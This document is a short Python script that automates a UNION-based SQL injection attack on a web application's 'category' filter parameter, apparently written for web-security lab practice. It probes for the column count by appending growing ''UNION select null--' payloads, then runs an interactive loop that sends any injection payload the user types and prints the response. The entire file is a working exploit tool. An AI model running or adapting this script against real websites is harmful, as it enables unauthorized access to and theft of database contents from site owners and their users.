from sys import argv 
from bs4 import BeautifulSoup
import requests

# This function will determine the number of columns required for a successful 
# union injection, after determining the number of columns, it will prompt the
# user for a tailored payload

def no_columns(url):
    try:
        url = url + "/filter?category=" 
        no_columns = 1
        payload = "null"
        while (True):
            query_value = f"'UNION select {payload}--"
            response = requests.get(url+query_value)
            response = BeautifulSoup(response.text,'html.parser')
            if "Internal Server Error" not in response.text:
                print(url+query_value)
                print("[+] UNION Injection successful the number of columns is " + str(no_columns))
                return url,query_value
            else:
                payload = payload + ",null"
                no_columns = no_columns + 1
        print("[-] Union Injection attempt unsuccessful")
        return 0,0
    except Exception as e:
        print(e)

# Once the number of columns has been determined for a successful union injection
# attack, input the user for a payload

def exploitation(payload,url):
    print(url)
    print("The injection payload is "+ payload)
    while (True):
        user_payload = input("Enter the injection payload that you would like to use: ")
        response = requests.get(url+user_payload)
        response = BeautifulSoup(response.text,'html.parser')
        print("\n")
        print(response)
        
if __name__ == "__main__":
    try:
        base_url = argv[1]
        url,payload = no_columns(base_url)
        if (url and payload != 0):
            exploitation(payload,url)
    except:
        print(f'[-] Usage: python3 {argv[0]} <url>')
